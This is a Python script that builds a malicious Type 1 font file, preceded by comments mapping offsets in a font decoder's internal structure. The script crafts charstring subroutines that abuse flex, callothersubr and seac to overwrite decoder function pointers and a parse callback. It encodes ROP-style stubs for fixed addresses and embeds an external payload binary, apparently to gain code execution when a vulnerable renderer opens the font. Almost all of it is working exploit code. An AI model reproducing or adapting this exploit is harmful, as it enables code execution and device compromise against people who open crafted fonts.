# 0    0x70: stack
# 256 0x470: top
# ...
# 313 0x554: num_subrs
# 314 0x558: subrs
# ...
# 337 0x5b4: ?
# 338 0x5b8: blend
# 339 0x5bc: hint_mode
# 340 0x5c0: parse_callback
# 341 0x5c4: funcs.init
# 342 0x5c8: funcs.done
# 343 0x5cc: funcs.parse_charstrings = t1_decoder_parse_charstrings
# 344 0x5d0: buildchar = <heap>
# 345 0x5d4: len_buildchar = 3
# 346 0x5d8: seac = 0
# 347 0x5dc: ?
# 348 0x5e0: ? = 0x208
# 349 0x5e4: ? = 0
# 350 0x5e8: ? = 0
# 351 0x5ec: ? = t1_driver_class

# first overwrite funcs.done and funcs.parse_charstrings using end flex
# then use THAT to overwrite hint_mode and parse_callback
# then use seac, which will call parse_callback(decoder, glyph idx)

import struct

def to_signed_dec(number):
    global large_int
    number %= (2**32)
    if number >= (2**31): number -= (2**32)
    if -32000 <= number <= 32000:
        if number != 0 and not large_int:
            raise Exception('to_signed_dec: nope (%x)' % number)
    else:
        large_int = True
    return str(number)

def encode_unknown(s):
    result = ''
    for char in str(s):
        result += 'UNKNOWN_%d ' % ord(char)
    return result

subrs = {}

file0 = 'i am a file'
file1 = 'i am also a file'

# these are read by the ROP stuff
subrs[0] = encode_unknown(open('../locutus/locutus').read())
subrs[1] = encode_unknown(file1)
#subrs[0] = '0 3735928559 setcurrentpoint return' # 0xdeadbeef

# start flex
subrs[2] = '0 1 callothersubr ' + '0 2 callothersubr '*7 + 'return'

main = '''3 0 setcurrentpoint
          2 callsubr           % prepare for the first run up
          -347 42 callothersubr
          callothersubr        % now at 344
          hmoveto hmoveto hmoveto
          setcurrentpoint      % hint_mode and parse_callback
                               % now at 339; want to get to 257 so we capture top
          hstem3 hstem3 hstem3 hstem3
          hstem3 hstem3 hstem3 hstem3
          hstem3 hstem3 hstem3 hstem3
          hstem3 UNKNOWN_15 UNKNOWN_15 hmoveto
                               % now x is blend, and y is parse_callback; come back down
          hstem3 250 42 callothersubr
          2 callsubr           % start flex so we can get x and y
          0 0 0 3 0 callothersubr pop pop
          1 2 24 callothersubr % parse_callback -> bca[1]
          0 2 24 callothersubr % blend -> bca[0]

          0                    % start the <= chain
          '''

addies = {0x33816765: (open('../goo/catalog/stub.txt').read(), open('../goo/catalog/catalog.txt').read()), 0x0000a000: ('xxxx', ''), 0x34000000: ('xxxx', '')}

subrno = max(filter(lambda a: isinstance(a, int), subrs.keys())) + 1

stack_400_loc = 20

for addy, (stub, catalog) in sorted(addies.items()):
    stub += '\0' * (-len(stub) & 3)
    stub = list(struct.unpack('I'*(len(stub)/4), stub))
    parse_callback = stub.pop(0)
    assert addy > 32000
    assert parse_callback > 32000
    subr = 'dotsection -%d 42 callothersubr ' % stack_400_loc
    large_int = False
    subr += '0 %s setcurrentpoint ' % to_signed_dec(parse_callback)
    for number in stub:
        #print hex(number)
        if (number & 0xffff0000) == 0xfefd0000: # code offset
            number += 0x10000 + 0x70 + stack_400_loc*4
        if number == 0xfefefefe: # the subr offset
            subr += to_signed_dec((subrno+1)*4) + ' '
        elif (number & 0xffff0000) == 0xfefe0000: # decoder offset
            subr += to_signed_dec((number - 0xfefe0000) - 0x70 - 257*4) + ' dotsection 0 1 25 callothersubr pop 2 20 callothersubr pop '
            large_int = False
        else:
            subr += to_signed_dec(number) + ' '
    subr += 'dotsection 2 callsubr %d 42 callothersubr return' % -(344 - stack_400_loc - len(stub))
    large_int = False
    subrs[subrno] = subr
    subrs[subrno+1] = encode_unknown(catalog)

    # the dotsection is to make large_integer false
    main += '\n' + str(subrno) + ' 1 1 25 callothersubr pop ' + to_signed_dec(addy - 1) + ' dotsection 4 27 callothersubr pop\n'
    
    subrno += 2

main += '''callsubr         % call the selected subr (which should push stuff, set y to an appropriate parse_callback, start flex, then go up to 344)
           callothersubr
           hstem3 hstem3 hstem3 hstem3
           hstem3 hstem3 hstem3 hstem3
           hstem3 hstem3 hstem3 hstem3
           hstem3 hstem3 hstem3

           0 0 0 64 64 seac % 64 = @
           endchar          % unnecessary if it worked'''

subrs['main'] = main

num_bca = 3 << 16 

template = open('dejavu.raw.template').read()
template = template.replace('%BCA%', ('0 ' * num_bca)[:-1])
template = template.replace('%THEPROGRAM%', subrs['main'])
template = template.replace('%NUMSUBRS%', '%d' % (len(subrs) - 1))
subrtext = ''
for num, subr in subrs.iteritems():
    if num == 'main': continue
    subrtext += 'dup %d {\n\t%s\n\t} put\n' % (num, subr)
template = template.replace('%SUBRS%', subrtext)

open('dejavu.raw', 'w').write(template)
